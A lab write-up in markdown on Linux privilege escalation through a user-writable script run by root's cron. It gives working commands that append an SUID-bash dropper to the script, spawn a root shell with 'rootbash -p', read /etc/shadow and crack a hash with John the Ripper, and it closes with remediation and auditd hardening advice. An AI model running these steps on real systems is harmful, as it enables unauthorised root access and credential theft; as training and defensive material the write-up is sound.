 <img src="https://raw.githubusercontent.com/01SIRIUS10/01SIRIUS10/main/Banner.png" width="100%" alt="SIRIUS Banner" />

# Lab 07: Scheduled Automation & Cron Jobs Privilege Escalation

| Metadata | Details |
| :--- | :--- |
| **Lab Name** | Linux Privilege Escalation — Task 8: Cron Jobs |
| **Target OS** | Ubuntu Linux / Debian-based |
| **Difficulty** | Medium |
| **Category** | Privilege Escalation / Scheduled Task Hijacking / Cryptanalysis |
| **Tools Used** | `cat`, `ls`, `chmod`, `bash`, `john`, `rockyou.txt` |
| **Key Concepts** | Cron Daemon Internals, Crontab Parsing, DAC Overreach, SUID Trapping, Salted SHA-512 Hash Cracking |

---

## 🎯 Goal
Audit and exploit misconfigured scheduled background automation tasks running under the administrative `root` context. Identify an unprivileged-writable maintenance script referenced within `/etc/crontab`, remediate file execution constraints, hijack the execution flow via an SUID root binary trap, recover restricted target flags, and extract and crack salted shadow password hashes offline.

---

## 🧠 Concept & Architecture

The Linux cron daemon (`cron` / `crond`) is a stateless background scheduler designed to execute unattended maintenance routines at predetermined time intervals derived from crontabs (cron tables).

```text
+-----------------------------------------------------------------------------------------+
| Linux Cron Execution Engine                                                             |
+-----------------------------------------------------------------------------------------+
|                                                                                         |
| 1. System Configuration File: /etc/crontab                                              |
| +---------------------------------------------------------------------------------+     |
| | Field:  min  hour  dom  mon  dow  user  command                                 |     |
| | Sched:  *    *     *    *    *    root  /home/karen/backup.sh                   |     |
| +---------------------------------------------------------------------------------+     |
| │                                                                                       |
| │ Polls Every 60s & Forks Process as UID 0                                              |
| ▼                                                                                       |
| 2. Discretionary Access Control (DAC) Boundary Failure                                  |
| +─────────────────────────────────────────────────────────────────────────────────+     |
| | Execution Identity : UID 0 (root)                                               |     |
| | Script Ownership   : karen:karen (-rw-r--r-- -> Misconfigured DAC Ownership)    |     |
| | Attack Surface     : Lower-privileged user possesses complete file write access |     |
| +─────────────────────────────────────────────────────────────────────────────────+     |
| │                                                                                       |
| │ Arbitrary Payload Injection                                                           |
| ▼                                                                                       |
| 3. System Compromise & Escalation Vector                                                |
| +─────────────────────────────────────────────────────────────────────────────────+     |
| | Injected Payload : cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash        |     |
| | Escalation Trigger : Invocation of /tmp/rootbash -p (euid=0 preserved)          |     |
| +─────────────────────────────────────────────────────────────────────────────────+     |
|                                                                                         |
+-----------------------------------------------------------------------------------------+
```

### 1. Crontab Syntax & Architectural Layout
System-wide jobs defined in `/etc/crontab` utilize a 7-field structure:
- **Minute (0–59):** Exact minute within the scheduled hour.
- **Hour (0–23):** Military-format hour of execution.
- **Day of Month (1–31):** Calendar day.
- **Month (1–12):** Numerical month.
- **Day of Week (0–7):** Day mapping (0 and 7 represent Sunday).
- **User Context:** Explicit username governing the spawned process (e.g., `root`).
- **Command String:** Command or script path passed directly to `/bin/sh`.

When five wildcards (`* * * * *`) are declared, the scheduler dispatches the defined routine at minute intervals (`:00` seconds of every minute).

### 2. Failure Modes in Scheduled Automation
1. **Insecure Discretionary Access Controls (DAC):** A script scheduled under `root` ownership that resides inside an unprivileged user's directory or retains world-writable permissions (`777` or user-owned `644`) permits immediate code execution injection.
2. **Missing Executable Permissions:** If an administrator creates a scheduled shell script but omits the execution bit (`chmod +x`), the cron daemon fails silently (`Permission denied` dropped to local mail). A low-privileged file owner can append code, apply `chmod +x`, and force arbitrary execution on the next clock cycle.
3. **Implicit PATH Resolution Exploitation:** Commands invoked without absolute paths (e.g., `antivirus.sh` instead of `/usr/sbin/antivirus.sh`) force the cron daemon to search directories defined in `/etc/crontab`'s `PATH` variable sequentially, enabling binary-planting attacks.

---

## 🔍 Enumeration

### 1. Crontab Configuration Audit
Initial reconnaissance targets the world-readable system crontab:

```bash
cat /etc/crontab
```

Example output:

```text
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12)
# |  |  |  |  .---- day of week (0 - 7) (Sunday=0 or 7)
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /antivirus.sh
* * * * * root antivirus.sh
* * * * * root /home/karen/backup.sh
* * * * * root /tmp/test.py
```

**Key Findings:**
- The bottom segment reveals 4 user-defined cron jobs executing outside standard OS maintenance routines.
- The entry `* * * * * root /home/karen/backup.sh` invokes a script located inside current user karen's home directory every 60 seconds as root.

### 2. Discretionary Access Control Inspection
Evaluating filesystem permissions on the target script:

```bash
ls -la /home/karen/backup.sh
```

Example output:

```text
-rw-r--r-- 1 karen karen 129 Nov 26 21:20 /home/karen/backup.sh
```

**Triage Analysis:**
- **Ownership:** karen:karen grants the local session full write access.
- **Execution Anomaly:** The permission mask is 644 (-rw-r--r--). The execution bit (x) is absent, preventing the cron daemon from invoking the binary directly until execution permissions are toggled.

---

## 💥 Exploitation Workflow

### Phase 1: Payload Construction & Permission Rectification
Review the existing maintenance script contents:

```bash
cat /home/karen/backup.sh
```

Example output:

```bash
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
```

Append an SUID bash dropper payload to the script:

```bash
echo "cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash" >> /home/karen/backup.sh
```

Enable the executable bit on the script:

```bash
chmod +x /home/karen/backup.sh
```

Verify modified permissions and appended payload:

```bash
ls -la /home/karen/backup.sh && tail -n 2 /home/karen/backup.sh
```

Example output:

```text
-rwxr-xr-x 1 karen karen 185 Nov 26 21:21 /home/karen/backup.sh
zip -r /home/admin/download.zip ./*
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
```

### Phase 2: SUID Privilege Escalation
Wait for the cron daemon interval (up to 60 seconds) and confirm binary deployment in `/tmp`:

```bash
ls -la /tmp/rootbash
```

Example output:

```text
-rwsr-sr-x 1 root root 1113504 Nov 26 21:22 /tmp/rootbash
```

Spawn the root shell using privilege preservation mode (`-p` prevents bash from dropping effective permissions):

```bash
/tmp/rootbash -p
```

Validate effective UID context:

```bash
id
```

Example output:

```text
uid=1000(karen) gid=1000(karen) euid=0(root) egid=0(root) groups=1000(karen)
```

### Phase 3: Flag Recovery
With administrative read authority established, locate and read `flag5.txt`:

```bash
find / -name "flag5.txt" 2>/dev/null
cat /home/ubuntu/flag5.txt
```

Example output:

```text
THM-3829182
```

### Phase 4: Shadow Database Extraction & Cryptanalysis
Exfiltrate the target password hash for user `matt` from `/etc/shadow`:

```bash
cat /etc/shadow | grep matt
```

Example output:

```text
matt:$6$9MhV6K8b$q3n18eG7wD5F/XgqF1Q1mK2yY2YI9kL...:18796:0:99999:7:::
```

Transfer the hash string to the local attacking machine (Kali Linux / AttackBox). Store it via a quoted Heredoc to prevent shell variable expansion:

```bash
cat << 'EOF' > matt_hash.txt
matt:$6$9MhV6K8b$q3n18eG7wD5F/XgqF1Q1mK2yY2YI9kL...:18796:0:99999:7:::
EOF
```

Ensure `rockyou.txt` is decompressed:

```bash
ls -la /usr/share/wordlists/rockyou*
# If compressed as rockyou.txt.gz, run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Run John the Ripper against the extracted SHA-512 crypt hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_hash.txt
```

Example output:

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
123456           (matt)
1g 0:00:00:00 DONE (2026-03-29 18:40) 2.439g/s 2400p/s 2400c/s 2400C/s 123456..password
```

Confirm cracked credentials:

```bash
john --show matt_hash.txt
```

Example output:

```text
matt:123456

1 password hash cracked, 0 left
```

---

## 🧬 Root Cause Analysis
1. **Insecure Script Ownership and Permissions**
The root task invoked `/home/karen/backup.sh`, a file located within an unprivileged user's directory and owned by `karen:karen`. This design flaw violates standard privilege separation by giving a lower-privileged identity write authority over code executed by UID 0.

2. **Relative Executable Invocations**
The presence of unanchored tasks (e.g., `antivirus.sh`) forces the cron interpreter to rely on `/etc/crontab`'s environmental `$PATH` resolution order, exposing the system to binary replacement if any path in `$PATH` is writable.

3. **Trivial Administrative Credentials**
Despite being hashed with 5000 rounds of SHA-512 crypt (`$6$`), user `matt` utilized an insecure dictionary word (`123456`). Cryptographic security factors fail immediately when plaintexts reside at the top of common dictionary lists.

---

## 🛡️ Remediation & Hardening

### 1. Harden Cron Script Ownership and Access Masks
All operational scripts referenced within system crontabs must be strictly owned by `root:root` with non-administrative write permissions revoked:

```bash
sudo chown root:root /home/karen/backup.sh
sudo chmod 700 /home/karen/backup.sh
```

### 2. Enforce Fully Qualified Binary Paths
Audit `/etc/crontab` entries to ensure absolute paths are declared across all scheduled automation:

```text
# Hardened Crontab Entry
* * * * * root /usr/local/bin/backup.sh
```

### 3. Enforce Strong PAM Credential Policies
Configure `pam_pwquality` to disallow common dictionary plaintexts and enforce sufficient character entropy:

```bash
# In /etc/security/pwquality.conf
minlen = 14
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
```

### 4. Implement Integrity Monitoring via Auditd
Deploy kernel audit rules to log modification events targeting crontab storage paths:

```text
-w /etc/crontab -p wa -k crontab_integrity
-w /var/spool/cron/ -p wa -k crontab_integrity
```

---

## 📝 My Lab Notes
- **Permission Bit Triage:** Adding command payloads to `/home/karen/backup.sh` initially yielded no output because the file lacked the execute bit (`-rw-r--r--`). Toggling `chmod +x` resolved the issue, allowing cron to trigger execution at the next minute boundary.
- **Separation of Target and Attack Nodes:** The target environment intentionally lacks auditing utilities (`john: command not found`). Cracking must always be performed offline on the attacker-controlled machine.
- **Heredoc Syntax Preservation:** Quoting the EOF delimiter (`cat << 'EOF'`) prevented the local shell from interpolating `$6$` and hash tokens as environment variables.

---

## 💡 Key Takeaways
- Code executed with UID 0 inherits the integrity of every file, script, and directory in its execution chain.
- Write access to an operational script is functionally equivalent to code execution as the invoking user.
- Modern cryptographic hashing protects against mathematical reversal, not weak human credential selection.

<p align="center"> <a href="06-capabilities.md">⬅️ Previous: POSIX Capabilities</a> • <a href="08-path-variable.md">➡️ Next: PATH Variable Abuse</a> </p>
